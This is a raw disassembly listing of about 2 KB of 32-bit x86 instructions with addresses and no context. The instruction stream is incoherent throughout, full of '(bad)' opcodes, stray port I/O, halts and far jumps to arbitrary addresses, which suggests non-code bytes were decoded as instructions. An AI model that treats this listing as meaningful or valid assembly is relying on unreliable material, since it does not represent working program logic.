  41382b:	fsqrt  
  41382d:	div    BYTE PTR [ecx-0x7e]
  413830:	inc    edi
  413831:	fdivr  DWORD PTR [ebx+0x66d8b5c3]
  413837:	add    bh,BYTE PTR [edi-0x2b]
  41383a:	out    0xe2,al
  41383c:	fild   QWORD PTR [ebx]
  41383e:	xchg   ebp,eax
  41383f:	pop    ebp
  413840:	or     eax,0x13676d21
  413845:	call   0x4268:0x9faa545d
  41384c:	(bad)  
  41384d:	xchg   ebx,eax
  41384e:	cmp    eax,0x4fe2c354
  413853:	(bad)  
  413854:	adc    cl,BYTE PTR [ecx+0x25]
  413857:	cmp    al,0xa2
  413859:	pop    DWORD PTR [eax+0xdf3f874]
  41385f:	stos   DWORD PTR es:[edi],eax
  413860:	sti    
  413861:	je     0x413884
  413863:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413864:	mov    ds:0x7c7a3f7a,al
  413869:	je     0x4138cb
  41386b:	push   cs
  41386c:	mul    DWORD PTR [ecx+0x4d]
  41386f:	mov    BYTE PTR [esi-0x39],cl
  413872:	or     esp,DWORD PTR [ebx]
  413874:	mov    dl,0x2b
  413876:	pop    ebx
  413877:	inc    esp
  413878:	push   es
  413879:	stos   BYTE PTR es:[edi],al
  41387a:	fisub  WORD PTR [edi+0x2e0184df]
  413880:	xor    al,0x23
  413882:	popf   
  413883:	popa   
  413884:	aam    0xa3
  413886:	clc    
  413887:	call   0xc762f91
  41388c:	push   ss
  41388d:	adc    al,0x4c
  41388f:	xchg   esi,eax
  413890:	push   ss
  413891:	in     eax,dx
  413892:	mov    esp,0x77e012a7
  413897:	arpl   WORD PTR [edx+0x3d],bp
  41389a:	shr    BYTE PTR [eax+0x10503c55],cl
  4138a0:	pop    esi
  4138a1:	mov    al,ds:0x47566549
  4138a6:	gs (bad) 
  4138a8:	shl    BYTE PTR [eax],cl
  4138aa:	dec    eax
  4138ab:	cld    
  4138ac:	stos   DWORD PTR es:[edi],eax
  4138ad:	(bad)  
  4138af:	adc    ah,BYTE PTR [ebx+0xb800a16]
  4138b5:	dec    eax
  4138b6:	mov    es,WORD PTR [esp+ecx*8-0x1f3c52ca]
  4138bd:	mov    ds:0x15f585d9,al
  4138c2:	icebp  
  4138c3:	cdq    
  4138c4:	scas   eax,DWORD PTR es:[edi]
  4138c5:	loopne 0x4138de
  4138c7:	cmp    DWORD PTR [eax],ebp
  4138c9:	shr    DWORD PTR [ecx],0x32
  4138cc:	or     ch,0xf7
  4138cf:	gs leave 
  4138d1:	shl    al,0x51
  4138d4:	outs   dx,DWORD PTR ds:[esi]
  4138d5:	ins    DWORD PTR es:[edi],dx
  4138d6:	xor    ebx,DWORD PTR [ecx+0x6311e2af]
  4138dc:	dec    esi
  4138dd:	pop    ecx
  4138de:	xchg   edx,eax
  4138df:	xor    eax,0x4bf4c854
  4138e4:	inc    esi
  4138e5:	adc    DWORD PTR [ebx+ecx*2+0x2fd60d84],esi
  4138ec:	outs   dx,DWORD PTR ds:[esi]
  4138ed:	push   ss
  4138ee:	mov    ecx,0x9174dee6
  4138f3:	shl    DWORD PTR [esi],cl
  4138f5:	jmp    FWORD PTR [eax]
  4138f7:	lea    ebp,[ecx+0x21909f54]
  4138fd:	(bad)  
  4138fe:	push   esp
  4138ff:	(bad)  
  413900:	in     al,0xd7
  413902:	lock mov bh,0x69
  413905:	je     0x41389c
  413907:	ins    BYTE PTR es:[edi],dx
  413908:	jle    0x413971
  41390a:	test   DWORD PTR [ebx+0x2d],0x3fda1052
  413911:	or     DWORD PTR [esi+0x2f877c3a],edx
  413917:	mov    ah,0xa8
  413919:	xor    al,0x6c
  41391b:	shl    DWORD PTR [esi+0x463879a5],cl
  413921:	mov    ebp,0xce29b01f
  413926:	adc    BYTE PTR [edx+edi*2-0x642f06a4],0x2b
  41392e:	mov    ecx,0x660a07c6
  413933:	adc    ecx,DWORD PTR [eax-0x234c78c4]
  413939:	push   ss
  41393a:	dec    eax
  41393b:	aas    
  41393c:	pop    ss
  41393d:	jno    0x41398f
  41393f:	mov    ah,0xbb
  413941:	xor    al,0x66
  413943:	xor    DWORD PTR [ebx],eax
  413945:	sub    eax,0x9341ca8e
  41394a:	lahf   
  41394b:	adc    BYTE PTR [edi+0x154eff42],al
  413951:	popf   
  413952:	push   cs
  413953:	mov    dh,0x52
  413955:	mov    dh,0x8f
  413957:	repnz (bad) 
  413959:	mov    DWORD PTR [edx+edx*8],esp
  41395c:	fcom   DWORD PTR [eax-0x3ccc67f3]
  413962:	hlt    
  413963:	or     BYTE PTR [ecx],ah
  413965:	sbb    al,0xde
  413967:	hlt    
  413968:	dec    ebp
  413969:	xchg   edi,eax
  41396a:	mov    ebp,0x3a54bde3
  41396f:	xchg   edx,eax
  413970:	mov    cl,0x83
  413972:	xor    bl,BYTE PTR [edx-0x8]
  413975:	sub    eax,0xef9b29b
  41397a:	mov    esi,0xfe4c758c
  41397f:	or     ecx,DWORD PTR [esi+0x5c5c6617]
  413985:	inc    ebp
  413986:	stc    
  413987:	mov    esp,0x2a3bb219
  41398c:	sahf   
  41398d:	add    dh,dl
  41398f:	pop    ecx
  413990:	(bad)  
  413991:	aas    
  413992:	mov    ds:0x54b7a60d,eax
  413997:	sbb    al,0x98
  413999:	add    eax,0xb7a7f561
  41399e:	mov    ds:0xa8568f2f,eax
  4139a3:	mov    bh,0xb5
  4139a5:	scas   eax,DWORD PTR es:[edi]
  4139a6:	call   0x97c0ddd2
  4139ab:	jae    0x41393b
  4139ad:	push   ecx
  4139ae:	leave  
  4139af:	cmp    BYTE PTR [esi-0x4bb59f24],al
  4139b5:	shl    al,1
  4139b7:	mov    ds:0xdb4fd7f7,al
  4139bc:	and    esi,DWORD PTR [edx-0x6cf8f98c]
  4139c2:	dec    ecx
  4139c3:	hlt    
  4139c4:	(bad)  
  4139c5:	pop    eax
  4139c6:	sub    al,ch
  4139c8:	mov    dh,0xee
  4139ca:	sbb    esi,DWORD PTR [ecx]
  4139cc:	and    eax,DWORD PTR [edx]
  4139ce:	(bad)  [esi+0x2bc0aad6]
  4139d4:	icebp  
  4139d5:	repz jle 0x4139a6
  4139d8:	push   edx
  4139d9:	adc    esp,DWORD PTR [ebp-0x5]
  4139dc:	pop    esp
  4139dd:	dec    edx
  4139de:	or     al,0x4
  4139e0:	and    DWORD PTR [ebp-0x2e],0xfffffff3
  4139e4:	ret    
  4139e5:	in     eax,dx
  4139e6:	jne    0x4139ed
  4139e8:	jb     0x413981
  4139ea:	div    DWORD PTR [ebp+0x3]
  4139ed:	jg     0x4139ea
  4139ef:	mov    bl,0x74
  4139f1:	(bad)  [eax]
  4139f3:	pushf  
  4139f4:	jne    0x413a69
  4139f6:	in     al,0xf8
  4139f8:	sbb    eax,edx
  4139fa:	sbb    BYTE PTR [ebx+0x299a0f0f],0x39
  413a01:	sbb    al,0x75
  413a03:	inc    edx
  413a04:	add    DWORD PTR [eax],ebx
  413a06:	or     eax,0x90ab1817
  413a0b:	mov    cl,0x12
  413a0d:	pushf  
  413a0e:	aam    0x40
  413a10:	sub    cl,dh
  413a12:	pusha  
  413a13:	aam    0xd2
  413a15:	cmp    dl,0xdc
  413a18:	ret    0x1550
  413a1b:	or     al,0x37
  413a1d:	pop    es
  413a1e:	jmp    DWORD PTR [ebx]
  413a20:	lds    ebx,FWORD PTR [edi-0x42a3286d]
  413a26:	jo     0x4139cf
  413a28:	pusha  
  413a29:	cld    
  413a2a:	ins    BYTE PTR es:[edi],dx
  413a2b:	xor    al,0xaf
  413a2d:	sub    BYTE PTR [eax+eax*4-0x3f],ch
  413a31:	xchg   esp,eax
  413a32:	dec    ecx
  413a33:	bound  esi,QWORD PTR [ecx]
  413a35:	cs xor bh,ch
  413a38:	int    0x7
  413a3a:	xor    bl,BYTE PTR [edi-0x2f]
  413a3d:	jae    0x413a73
  413a3f:	dec    ecx
  413a40:	mov    edi,0x7b1d0bd0
  413a45:	jo     0x4139dc
  413a47:	in     eax,0xc9
  413a49:	push   0x911aca97
  413a4e:	repnz xchg ecx,eax
  413a50:	mov    al,0x71
  413a52:	test   DWORD PTR [ecx],ecx
  413a54:	adc    BYTE PTR [eax-0x10],al
  413a57:	(bad)  
  413a58:	xchg   ebp,eax
  413a59:	sbb    ch,BYTE PTR [edi+ecx*2+0x55]
  413a5d:	sub    BYTE PTR [ecx+edx*8+0x49db6ffd],cl
  413a64:	fstp   st(3)
  413a66:	movhps QWORD PTR [ebp+0x63370fef],xmm5
  413a6d:	sub    eax,0xb2698283
  413a72:	pop    esp
  413a73:	fs call 0xf78193b
  413a79:	(bad)  
  413a7c:	pop    ds
  413a7d:	inc    eax
  413a7e:	cwde   
  413a7f:	mov    eax,ds:0xca64a55d
  413a84:	mul    bh
  413a86:	and    esp,DWORD PTR [edi-0x2cd984ff]
  413a8c:	and    sp,WORD PTR [ebp-0x77909855]
  413a93:	test   BYTE PTR [esi-0x54f7e186],dl
  413a99:	neg    BYTE PTR [ebp+0x3d3e189a]
  413a9f:	popa   
  413aa0:	jp     0x413a5b
  413aa2:	fimul  WORD PTR [eax+0x50]
  413aa5:	xor    ecx,DWORD PTR [edx]
  413aa7:	dec    edx
  413aa8:	out    dx,eax
  413aa9:	push   ecx
  413aaa:	sub    DWORD PTR [edx+0x74b57c13],0x1c
  413ab1:	std    
  413ab2:	inc    edx
  413ab3:	cli    
  413ab4:	ss sar bh,0x16
  413ab8:	iret   
  413ab9:	in     al,0x97
  413abb:	xchg   ebx,eax
  413abc:	jmp    0x5f110346
  413ac1:	shr    DWORD PTR [eax-0x23],cl
  413ac4:	inc    ebp
  413ac5:	jmp    0x1c46:0x24e0eefc
  413acc:	outs   dx,BYTE PTR ds:[esi]
  413acd:	outs   dx,BYTE PTR ds:[esi]
  413ace:	mov    cl,0xf5
  413ad0:	int3   
  413ad1:	(bad)  
  413ad2:	shr    esp,0xa6
  413ad5:	pop    edi
  413ad6:	scas   al,BYTE PTR es:[edi]
  413ad7:	lock push edx
  413ad9:	jp     0x413a71
  413adb:	push   0x212049b8
  413ae0:	pop    eax
  413ae1:	inc    ebp
  413ae2:	mov    al,ds:0x70abd4c8
  413ae7:	jp     0x413b4f
  413ae9:	adc    eax,0x3d080a97
  413aee:	and    DWORD PTR [esi+0x42],edi
  413af1:	call   0x9394235a
  413af6:	dec    esp
  413af7:	or     BYTE PTR [ebx+0x721e6e7e],ah
  413afd:	sbb    BYTE PTR [edx+edi*1],ch
  413b00:	add    al,0xce
  413b02:	adc    esp,0x383e7ab
  413b08:	and    eax,0x80d239e0
  413b0d:	sub    eax,0x354c1f0
  413b12:	sbb    cl,bl
  413b14:	xchg   bl,ch
  413b16:	pop    es
  413b17:	xor    bh,BYTE PTR [ecx-0x2c]
  413b1a:	das    
  413b1b:	int3   
  413b1c:	icebp  
  413b1d:	mov    eax,eax
  413b1f:	clc    
  413b20:	pop    ds
  413b21:	xchg   edi,eax
  413b22:	or     bh,BYTE PTR [edi+0x7f]
  413b25:	mov    edi,esi
  413b27:	or     ah,BYTE PTR [edx-0x4c]
  413b2a:	xor    al,0xca
  413b2c:	dec    edx
  413b2d:	popa   
  413b2e:	xchg   edx,eax
  413b2f:	add    eax,esp
  413b31:	loopne 0x413b36
  413b33:	mov    dh,0xb2
  413b35:	pop    esp
  413b36:	inc    ebp
  413b37:	push   esi
  413b38:	pop    ds
  413b39:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  413b3a:	mov    cl,0x4a
  413b3c:	shl    esi,1
  413b3e:	lock inc ebp
  413b40:	sbb    al,0xa5
  413b42:	les    edx,FWORD PTR [edx-0x5a5dca5c]
  413b48:	pop    ebp
  413b49:	hlt    
  413b4a:	ficom  DWORD PTR [eax]
  413b4c:	push   edx
  413b4d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413b4e:	xor    al,0x5
  413b50:	mov    al,0x18
  413b52:	mov    WORD PTR [edx],ss
  413b54:	mov    WORD PTR [esi-0x5d],cs
  413b57:	or     edi,ebp
  413b59:	je     0x413aea
  413b5b:	mov    dh,0x6e
  413b5d:	out    dx,al
  413b5e:	call   0x5f8:0x3361434d
  413b65:	scas   al,BYTE PTR es:[edi]
  413b66:	in     eax,0x71
  413b68:	jae    0x413be2
  413b6a:	mov    es,WORD PTR [ecx+ecx*4+0x76e98e1c]
  413b71:	or     ch,dl
  413b73:	dec    esi
  413b74:	and    DWORD PTR [ecx],eax
  413b76:	arpl   cx,bp
  413b78:	sbb    BYTE PTR [edi+0x16],bh
  413b7b:	js     0x413b92
  413b7d:	pop    di
  413b7f:	call   0x42a1:0x54e94d17
  413b86:	add    dh,BYTE PTR [eax+eax*1-0x60]
  413b8a:	mov    al,ds:0x1f1bdd7c
  413b8f:	ins    BYTE PTR es:[edi],dx
  413b90:	in     eax,0x62
  413b92:	rcr    DWORD PTR [eax+0x2590a662],0xa
  413b99:	jne    0x413b45
  413b9b:	addr16 pop eax
  413b9d:	inc    ebx
  413b9e:	mov    cl,0xad
  413ba0:	xchg   ecx,eax
  413ba1:	sbb    DWORD PTR [eax+0x47],0xa8239283
  413ba8:	(bad)  
  413ba9:	in     eax,dx
  413baa:	pop    ebp
  413bab:	out    0x79,eax
  413bad:	push   ecx
  413bae:	fistp  QWORD PTR [edx+edi*8+0x7db48a37]
  413bb5:	add    al,0x74
  413bb7:	mov    al,ds:0x22255174
  413bbc:	(bad)  [ebp+0x69afd21b]
  413bc2:	push   0x1b
  413bc4:	sahf   
  413bc5:	jg     0x413bb6
  413bc7:	int    0xf6
  413bc9:	and    edx,edi
  413bcb:	inc    esp
  413bcc:	idiv   DWORD PTR [ecx+0x41601cfe]
  413bd2:	dec    edi
  413bd3:	inc    esp
  413bd4:	lock inc edi
  413bd6:	popa   
  413bd7:	test   al,0x6
  413bd9:	and    al,0xf6
  413bdb:	test   BYTE PTR [ebp+0x716c4a16],bh
  413be1:	ss dec edx
  413be3:	leave  
  413be4:	pop    es
  413be5:	popf   
  413be6:	jno    0x413bed
  413be8:	ror    BYTE PTR [eax+ebp*2],0x4a
  413bec:	mov    bl,0x8b
  413bee:	lds    edi,FWORD PTR [edi]
  413bf0:	mov    edi,0xeda85242
  413bf5:	or     ecx,DWORD PTR [edi-0xa]
  413bf8:	xchg   edi,eax
  413bf9:	jmp    0xc8d9989a
  413bfe:	dec    esi
  413bff:	xchg   esp,eax
  413c00:	(bad)  
  413c01:	test   BYTE PTR [edx+eiz*8+0x7b],0x75
  413c06:	or     BYTE PTR [edx-0x5],dh
  413c09:	pusha  
  413c0a:	call   0xbbd1:0x46882a38
  413c11:	rcl    BYTE PTR [ebp-0x24],1
  413c14:	scas   al,BYTE PTR es:[edi]
  413c15:	jecxz  0x413bc1
  413c17:	jmp    0xa5fcc8b3
  413c1c:	jne    0x413c79
  413c1e:	scas   eax,DWORD PTR es:[edi]
  413c1f:	into   
  413c20:	add    DWORD PTR [eax+ebx*1],eax
  413c23:	lahf   
  413c24:	add    al,BYTE PTR [edi-0x51094223]
  413c2a:	sub    DWORD PTR [eax+0x14320e70],esp
  413c30:	lahf   
  413c31:	cmc    
  413c32:	(bad)  
  413c33:	cmp    eax,0x14d63c95
  413c38:	test   BYTE PTR [eax+0x183f267],ah
  413c3e:	clc    
  413c3f:	pop    es
  413c40:	xchg   ecx,eax
  413c41:	xchg   dh,ah
  413c43:	scas   eax,DWORD PTR es:[edi]
  413c44:	imul   ecx,ecx,0x1a
  413c47:	jne    0x413c5f
  413c49:	mov    WORD PTR [edx+0x3c],cs
  413c4c:	pusha  
  413c4d:	add    eax,0xf5f06ae9
  413c52:	arpl   dx,di
  413c54:	lsl    edi,WORD PTR [ecx+0x3e]
  413c58:	pushf  
  413c59:	das    
  413c5a:	mov    esi,0xf7d30f87
  413c5f:	leave  
  413c60:	pop    ss
  413c61:	adc    eax,0x80ddcbf8
  413c66:	jp     0x413c2b
  413c68:	je     0x413c98
  413c6a:	sub    ecx,edi
  413c6c:	sub    al,0xc4
  413c6e:	mov    edx,0x5f499c09
  413c73:	es mov bl,0xea
  413c76:	jmp    0x413c61
  413c78:	pop    es
  413c79:	(bad)  
  413c7a:	cli    
  413c7b:	in     eax,dx
  413c7c:	(bad)  
  413c7d:	and    edx,DWORD PTR [edx]
  413c7f:	adc    BYTE PTR [edx-0x4efb1604],0x4d
  413c86:	popf   
  413c87:	mov    bl,0xdf
  413c89:	cmc    
  413c8a:	pop    ebx
  413c8b:	ss jo  0x413c73
  413c8e:	retf   0xa57d
  413c91:	jmp    0x413cf6
  413c93:	ds ins BYTE PTR es:[edi],dx
  413c95:	sbb    eax,0x653dfc6f
  413c9a:	xchg   ebp,eax
  413c9b:	push   0x9
  413c9d:	add    eax,esi
  413c9f:	jl     0x413c54
  413ca1:	addr16 pop eax
  413ca3:	mov    dl,0x13
  413ca5:	add    al,cl
  413ca7:	jecxz  0x413cac
  413ca9:	push   ebp
  413caa:	mov    ecx,0x2f724b3b
  413caf:	push   edx
  413cb0:	jp     0x413c68
  413cb2:	xchg   edx,eax
  413cb3:	sbb    eax,0x1d23bcb4
  413cb8:	bound  eax,QWORD PTR [ebx]
  413cba:	retf   
  413cbb:	push   edi
  413cbc:	or     eax,edi
  413cbe:	cmc    
  413cbf:	and    al,0x19
  413cc1:	loopne 0x413d16
  413cc3:	(bad)  
  413cc4:	jb     0x413c55
  413cc6:	sub    al,bh
  413cc8:	push   0xc13a30e6
  413ccd:	xchg   ebx,eax
  413cce:	enter  0x3db2,0x65
  413cd2:	sahf   
  413cd3:	push   0xbf6a3cf0
  413cd8:	push   ecx
  413cd9:	ja     0x413d23
  413cdb:	inc    ecx
  413cdc:	in     al,dx
  413cdd:	pop    edx
  413cde:	call   0x95bc:0x44ce8a91
  413ce5:	pop    esp
  413ce6:	enter  0xaa8a,0x9f
  413cea:	(bad)  
  413ceb:	mov    al,0x46
  413ced:	fwait
  413cee:	(bad)  
  413cef:	xchg   esp,eax
  413cf0:	cmp    eax,0x2904d58b
  413cf5:	mov    eax,0x7c6e9f87
  413cfa:	popf   
  413cfb:	fst    st(3)
  413cfd:	ins    DWORD PTR es:[edi],dx
  413cfe:	ret    0x5948
  413d01:	rcr    DWORD PTR [edi+0x65],0x44
  413d05:	or     edx,DWORD PTR [eax]
  413d07:	in     al,dx
  413d08:	outs   dx,DWORD PTR ds:[esi]
  413d09:	xor    eax,0x897688c7
  413d0e:	js     0x413d0c
  413d10:	pop    esp
  413d11:	mov    bl,0x2e
  413d13:	cdq    
  413d14:	in     al,dx
  413d15:	xor    eax,ebp
  413d17:	rol    DWORD PTR [ebx*2-0x62966c5d],cl
  413d1e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413d1f:	xchg   ebp,eax
  413d20:	or     eax,0xd8408861
  413d25:	add    esp,DWORD PTR [esi-0x62]
  413d28:	dec    eax
  413d29:	mov    ebx,0xc55d33d0
  413d2e:	stos   DWORD PTR es:[edi],eax
  413d2f:	adc    eax,0x5e64f533
  413d34:	in     al,0xd9
  413d36:	and    BYTE PTR ds:0x79497321,ch
  413d3c:	mov    ds:0xf441f415,al
  413d41:	outs   dx,DWORD PTR ds:[esi]
  413d42:	int    0x86
  413d44:	addr16 xchg ebp,eax
  413d46:	inc    ecx
  413d47:	mov    dl,0xbd
  413d49:	dec    esi
  413d4a:	xlat   BYTE PTR ds:[ebx]
  413d4b:	pop    es
  413d4c:	and    bh,BYTE PTR [ecx+0x3e109903]
  413d52:	outs   dx,DWORD PTR ds:[esi]
  413d53:	sub    eax,0x75254080
  413d58:	mov    esi,0x3c67d8c5
  413d5d:	cmc    
  413d5e:	(bad)  
  413d5f:	jmp    0x413da1
  413d61:	push   esi
  413d62:	jno    0x413de2
  413d64:	xchg   esp,eax
  413d65:	pop    edi
  413d66:	add    eax,0x423132a6
  413d6b:	mov    bh,BYTE PTR [eax]
  413d6d:	(bad)  
  413d6e:	pop    esp
  413d6f:	jno    0x413d5d
  413d71:	aad    0xc6
  413d73:	fsubr  DWORD PTR [edi-0x6ecf62aa]
  413d79:	mov    DWORD PTR [ecx+0x2c6f7e91],eax
  413d7f:	aas    
  413d80:	lods   al,BYTE PTR ds:[esi]
  413d81:	xor    DWORD PTR [ecx],edi
  413d83:	aaa    
  413d84:	push   ebp
  413d85:	sbb    BYTE PTR [esi-0x388f8271],0xf4
  413d8c:	in     al,dx
  413d8d:	sbb    al,0x48
  413d8f:	mov    ds:0xec016141,al
  413d94:	hlt    
  413d95:	pop    ds
  413d96:	push   ebp
  413d97:	xor    bh,ch
  413d99:	scas   eax,DWORD PTR es:[edi]
  413d9a:	stos   DWORD PTR es:[edi],eax
  413d9b:	jmp    0xc925:0x4301fbf8
  413da2:	sub    BYTE PTR ds:0x717bed81,dh
  413da8:	adc    BYTE PTR [ebx],0xd6
  413dab:	pop    ebp
  413dac:	inc    ebx
  413dad:	into   
  413dae:	mov    dl,0x1
  413db0:	test   DWORD PTR [edx],esi
  413db2:	outs   dx,BYTE PTR ds:[esi]
  413db3:	mov    ch,0xdb
  413db5:	inc    ebx
  413db6:	in     eax,0xfc
  413db8:	push   edx
  413db9:	xchg   sp,ax
  413dbb:	jo     0x413e38
  413dbd:	mov    bl,BYTE PTR [eax-0x2]
  413dc0:	ins    DWORD PTR es:[edi],dx
  413dc1:	jo     0x413e2d
  413dc3:	mov    al,0xc8
  413dc5:	xchg   DWORD PTR [ebp+0x67a59ab0],ebx
  413dcb:	add    al,0xa8
  413dcd:	inc    edi
  413dce:	or     al,0xc6
  413dd0:	fwait
  413dd1:	and    BYTE PTR [esi+0x27],0xf5
  413dd5:	push   ds
  413dd6:	ins    DWORD PTR es:[edi],dx
  413dd7:	outs   dx,BYTE PTR ds:[esi]
  413dd8:	loop   0x413db3
  413dda:	xor    DWORD PTR [eax+0x44f81885],0xdab0c18c
  413de4:	out    0xb2,eax
  413de6:	push   ebx
  413de7:	mov    ebx,0x623543
  413dec:	arpl   WORD PTR [esi-0x1e],dx
  413def:	mov    ebp,0x18fb8819
  413df4:	mov    al,ds:0x816785b2
  413df9:	mov    edi,0x2001b36d
  413dfe:	arpl   WORD PTR [esi+ebp*8+0x2f],cx
  413e02:	add    cl,bl
  413e04:	mov    dh,0x2
  413e06:	imul   esp,DWORD PTR [ebx+0x79a44e99],0xa5b0798b
  413e10:	xor    BYTE PTR [ecx+0x5ea6de64],al
  413e16:	daa    
  413e17:	jbe    0x413e88
  413e19:	mov    ebx,0x9f1ee4bc
  413e1e:	and    DWORD PTR [ebp-0x7b],esi
  413e21:	dec    ecx
  413e22:	out    dx,eax
  413e23:	push   es
  413e24:	out    dx,al
  413e25:	pop    ds
  413e26:	push   edx
  413e27:	jp     0x413e85
  413e29:	mov    ?,ebp
  413e2b:	test   DWORD PTR [eax+edx*2+0x7e],eax
  413e2f:	mov    ch,0x47
  413e31:	jbe    0x413def
  413e33:	cmp    eax,0xf2deea51
  413e38:	(bad)  
  413e39:	jmp    0x537b8a96
  413e3e:	xlat   BYTE PTR ds:[ebx]
  413e3f:	xor    BYTE PTR [eax],bh
  413e41:	push   edx
  413e42:	or     DWORD PTR [eax+0x3e],edx
  413e45:	movs   BYTE PTR es:[edi],BYTE PTR es:[esi]
  413e47:	mov    eax,ds:0xe1c8aad0
  413e4c:	sbb    eax,0xc44ccd6f
  413e51:	mov    ebx,0xa3fc39f2
  413e56:	lahf   
  413e57:	jmp    DWORD PTR [esp+0x77826524]
  413e5e:	mov    ah,0x52
  413e60:	jns    0x413e38
  413e62:	rcl    bl,0xcb
  413e65:	arpl   WORD PTR [esp+ecx*2],sp
  413e68:	adc    ch,BYTE PTR [esi+0x2e]
  413e6b:	adc    bl,BYTE PTR ds:0xc74190ee
  413e71:	ror    BYTE PTR [esi+edi*8],cl
  413e74:	jmp    0xe2412b65
  413e79:	mov    ebx,0x66ca025f
  413e7e:	aas    
  413e7f:	les    eax,FWORD PTR [edx]
  413e81:	mov    bh,0x97
  413e83:	adc    eax,0x22e55bf5
  413e88:	dec    esi
  413e89:	cmp    DWORD PTR [eax],ebp
  413e8b:	push   0xfffffff6
  413e8d:	loope  0x413e96
  413e8f:	dec    ebp
  413e90:	out    0x7e,al
  413e92:	pop    esp
  413e93:	xor    BYTE PTR [eax+0x6b7c7e8e],dl
  413e99:	and    al,0xc4
  413e9b:	inc    edx
  413e9c:	out    0xfd,al
  413e9e:	or     ebp,DWORD PTR [ebp+0x5ac0d380]
  413ea4:	jbe    0x413f0a
  413ea6:	enter  0xd2ae,0x13
  413eaa:	mov    edx,0x7d6012c8
  413eaf:	cmp    eax,0x571189e5
  413eb4:	mov    ebx,0x16cc7a6e
  413eb9:	and    dh,BYTE PTR [ebp-0x21440763]
  413ebf:	sbb    ch,BYTE PTR [esi-0x4e]
  413ec2:	pusha  
  413ec3:	lea    ebx,[esi-0x39]
  413ec6:	mov    dh,BYTE PTR [esi+0x47dbb367]
  413ecc:	(bad)  
  413ecd:	rol    BYTE PTR [ebx-0x42],0xb0
  413ed1:	mov    bl,0xe7
  413ed3:	sbb    al,0x58
  413ed5:	cmp    ch,cl
  413ed7:	aad    0xd1
  413ed9:	pop    esi
  413eda:	mov    ds:0x83f85105,eax
  413edf:	jmp    0x413e63
  413ee1:	mov    ds:0xfcb54449,al
  413ee6:	adc    bh,BYTE PTR [eax+0x4a]
  413ee9:	and    BYTE PTR [eax-0x78],0x3b
  413eed:	shl    BYTE PTR [ecx+0x8884f05],1
  413ef3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  413ef4:	(bad)  
  413ef5:	sti    
  413ef6:	push   0xa
  413ef8:	push   es
  413ef9:	push   ebx
  413efa:	in     al,dx
  413efb:	data16 (bad) 
  413efd:	and    eax,0x63fb917d
  413f02:	fist   DWORD PTR [ebp-0x24]
  413f05:	dec    ebp
  413f06:	push   esp
  413f07:	repz add al,0xf7
  413f0a:	mov    al,ds:0x6184ff06
  413f0f:	lea    ebp,[ebp+0x42]
  413f12:	sub    BYTE PTR [edx],dh
  413f14:	mov    al,0x53
  413f16:	and    bl,dh
  413f18:	mov    dl,0xb2
  413f1a:	sbb    ah,bh
  413f1c:	or     al,0xd7
  413f1e:	inc    ecx
  413f1f:	adc    eax,ebp
  413f21:	je     0x413f37
  413f23:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  413f24:	mov    DWORD PTR ds:0xf8456f9a,edx
  413f2a:	test   DWORD PTR [ebp-0x924d82a],ebx
  413f30:	xchg   esp,eax
  413f31:	outs   dx,DWORD PTR ds:[esi]
  413f32:	mov    bh,0xc0
  413f34:	sbb    al,0x38
  413f36:	or     BYTE PTR [ebp-0x72942aba],al
  413f3c:	mov    esi,0x3872da05
  413f41:	push   cs
  413f42:	inc    esi
  413f43:	lock jmp FWORD PTR [edi-0x2f]
  413f47:	rcl    DWORD PTR [edx-0xc],1
  413f4a:	xor    al,BYTE PTR [ecx+ebp*4]
  413f4d:	or     al,0xa9
  413f4f:	nop
  413f50:	mov    edx,DWORD PTR [edi+0x622b5195]
  413f56:	mov    dl,0xb4
  413f58:	jmp    0x413fcf
  413f5a:	int    0xc4
  413f5c:	xor    dl,0x10
  413f5f:	adc    esi,DWORD PTR [edx]
  413f61:	inc    edi
  413f62:	push   ss
  413f63:	fild   WORD PTR [edx+0x32]
  413f66:	and    eax,0xb3669c3d
  413f6b:	hlt    
  413f6c:	out    0x71,eax
  413f6e:	rcr    BYTE PTR [esi+esi*8+0x6fee7758],0xb
  413f76:	call   0x1066:0x72d47cea
  413f7d:	test   al,0x81
  413f7f:	cwde   
  413f80:	test   DWORD PTR [ebp-0x78],0x862941
  413f87:	cmp    ch,cl
  413f89:	daa    
  413f8a:	sub    al,0x26
  413f8c:	sbb    ebx,edx
  413f8e:	push   0x3b
  413f90:	mov    bh,0xbb
  413f92:	sub    DWORD PTR [ebx-0x3989d47],ebp
  413f98:	in     al,0x8d
  413f9a:	das    
  413f9b:	adc    DWORD PTR [ecx+edi*4],0xffffffbb
  413f9f:	cmp    BYTE PTR [eax-0x31],ch
  413fa2:	mov    ebx,0x3ec3b2b4
  413fa7:	cli    
  413fa8:	es aad 0x17
  413fab:	mov    edi,0x98554af7
  413fb0:	jmp    0x413fb1
  413fb2:	jns    0x413f3e
  413fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  413fb5:	int3   
  413fb6:	adc    DWORD PTR [eax],0xffffffb5
  413fb9:	xchg   edi,eax
  413fba:	lahf   
  413fbb:	pushf  
  413fbc:	or     al,0xce
  413fbe:	rol    BYTE PTR [ebp-0x1a],1
  413fc1:	daa    
  413fc2:	popf   
  413fc3:	stos   BYTE PTR es:[edi],al
  413fc4:	outs   dx,DWORD PTR ds:[esi]
  413fc5:	mov    al,ds:0xa008c42e
  413fca:	lahf   
  413fcb:	mov    eax,ds:0x13c3ee51
  413fd0:	sbb    cl,BYTE PTR [esi+0xe]
  413fd3:	jmp    0x3780a9af
  413fd8:	and    al,0x6d
  413fda:	(bad)  
  413fdb:	ins    DWORD PTR es:[edi],dx
  413fdc:	mov    ebp,0x71db3516
  413fe1:	jl     0x413ff4
  413fe3:	fld    DWORD PTR [edi]
  413fe5:	mov    edx,ds
  413fe7:	inc    ebx
  413fe8:	sahf   
  413fe9:	test   al,0xd1
  413feb:	and    BYTE PTR [eax+0x2b97665e],cl
  413ff1:	mov    cl,0xce
  413ff3:	stos   DWORD PTR es:[edi],eax
  413ff4:	(bad)  
  413ff5:	mul    DWORD PTR [ebx]
  413ff7:	sub    DWORD PTR [edx-0x295ae34f],edx
  413ffd:	fst    DWORD PTR [ebp+0x1159187e]
  414003:	xor    ah,BYTE PTR [eax+0x7]
  414006:	loopne 0x413fb0
  414008:	xchg   esp,eax
  414009:	leave  
  41400a:	repz jb 0x413f94
